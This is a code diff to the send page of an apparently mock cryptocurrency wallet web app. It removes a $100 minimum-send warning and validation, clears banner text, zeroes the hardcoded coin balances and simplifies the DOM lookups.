@@ -264,23 +264,6 @@
             font-weight: 600;
         }
         
-        /* New styles for minimum amount warning */
-        .minimum-warning {
-            background: rgba(231, 76, 60, 0.1);
-            border: 1px solid rgba(231, 76, 60, 0.3);
-            border-radius: 8px;
-            padding: 12px;
-            margin-top: 15px;
-            font-size: 14px;
-            text-align: center;
-            display: none;
-        }
-        
-        .minimum-warning i {
-            color: #e74c3c;
-            margin-right: 5px;
-        }
-        
         /* Continue button */
         .continue-btn {
             color: white;
@@ -476,7 +459,7 @@
     <div class="crypto-bg" id="cryptoBg"></div>
       <div class="container">
         <div class="android-banner">
-            <i class="fab fa-android"></i> Cryptophase Wallet v3.1.6 - Now with enhanced security features
+            <i class=""></i> 
         </div>
 
         
@@ -507,11 +490,6 @@
                     </div>
                     <div class="conversion">
                         You will receive <span class="conversion-value" id="conversionValue">$0.00</span>
-                    </div>
-                    
-                    <!-- Minimum amount warning -->
-                    <div class="minimum-warning" id="minimumWarning">
-                        <i class="fas fa-exclamation-circle"></i> Minimum amount to send is $100 USD
                     </div>
                 </div>
                 
@@ -602,8 +580,8 @@
                 name: "Bitcoin",
                 symbol: "BTC",
                 icon: "fab fa-btc",
-                balance: 1.25,
-                usdBalance: 147358.75,
+                balance: 0,
+                usdBalance: 0,
                 iconClass: "btc-icon",
                 price: 117887.00
             },
@@ -611,8 +589,8 @@
                 name: "Ethereum",
                 symbol: "ETH",
                 icon: "fab fa-ethereum",
-                balance: 8.75,
-                usdBalance: 25875.16,
+                balance: 0,
+                usdBalance: 0,
                 iconClass: "eth-icon",
                 price: 2957.19
             },
@@ -620,8 +598,8 @@
                 name: "BNB",
                 symbol: "BNB",
                 icon: "fab fa-bnb",
-                balance: 15.5,
-                usdBalance: 10689.10,
+                balance: 0,
+                usdBalance: 0,
                 iconClass: "bnb-icon",
                 price: 689.62
             },
@@ -629,8 +607,8 @@
                 name: "TRON",
                 symbol: "TRX",
                 icon: "fas fa-bolt",
-                balance: 1250,
-                usdBalance: 375,
+                balance: 0,
+                usdBalance: 0,
                 iconClass: "trx-icon",
                 price: 0.30
             },
@@ -657,7 +635,7 @@
             return amount * 0.15;
         }
         
-             // Calculate TRX equivalent of USDT amount
+        // Calculate TRX equivalent of USDT amount
         function calculateTrxEquivalent(usdtAmount, trxPrice = 0.30) {
             return usdtAmount / trxPrice;
         }
@@ -677,7 +655,7 @@
             }
         }
         
-        // Load asset data
+             // Load asset data
         function loadAsset() {
             const assetKey = getAssetFromURL();
             const asset = assets[assetKey];
@@ -698,23 +676,12 @@
             assetIcon.className = `asset-icon-large ${asset.iconClass}`;
             assetIcon.innerHTML = `<i class="${asset.icon}"></i>`;
             
-            // Get references to elements
-            const amountInput = document.getElementById('amountInput');
-            const conversionValue = document.getElementById('conversionValue');
-            const warningElement = document.getElementById('minimumWarning');
-            
             // Update conversion rate
-            amountInput.addEventListener('input', function() {
+            document.getElementById('amountInput').addEventListener('input', function() {
                 const amount = parseFloat(this.value) || 0;
                 const usdValue = amount * asset.price;
-                conversionValue.textContent = `$${usdValue.toFixed(2)}`;
-                
-                // Show/hide minimum amount warning
-                if (usdValue > 0 && usdValue < 100) {
-                    warningElement.style.display = 'block';
-                } else {
-                    warningElement.style.display = 'none';
-                }
+                document.getElementById('conversionValue').textContent = 
+                    `$${usdValue.toFixed(2)}`;
                 
                 // Update TRX fee display for USDT
                 if (isUsdt) {
@@ -724,16 +691,10 @@
             
             // Set max button
             document.getElementById('maxBtn').addEventListener('click', function() {
-                amountInput.value = asset.balance.toFixed(4);
+                document.getElementById('amountInput').value = asset.balance.toFixed(4);
                 const usdValue = asset.balance * asset.price;
-                conversionValue.textContent = `$${usdValue.toFixed(2)}`;
-                
-                // Show/hide warning based on max value
-                if (usdValue < 100) {
-                    warningElement.style.display = 'block';
-                } else {
-                    warningElement.style.display = 'none';
-                }
+                document.getElementById('conversionValue').textContent = 
+                    `$${usdValue.toFixed(2)}`;
                 
                 // Update TRX fee display for USDT
                 if (isUsdt) {
@@ -743,15 +704,8 @@
             
             // Continue button
             document.getElementById('continueBtn').addEventListener('click', function() {
-                const amount = parseFloat(amountInput.value) || 0;
+                const amount = parseFloat(document.getElementById('amountInput').value) || 0;
                 const address = document.getElementById('addressInput').value;
-                const usdValue = amount * asset.price;
-                
-                // Validate minimum amount
-                if (usdValue < 100) {
-                    alert('Minimum amount to send is $100 USD');
-                    return;
-                }
                 
                 if (!address) {
                     alert('Please enter a valid address');
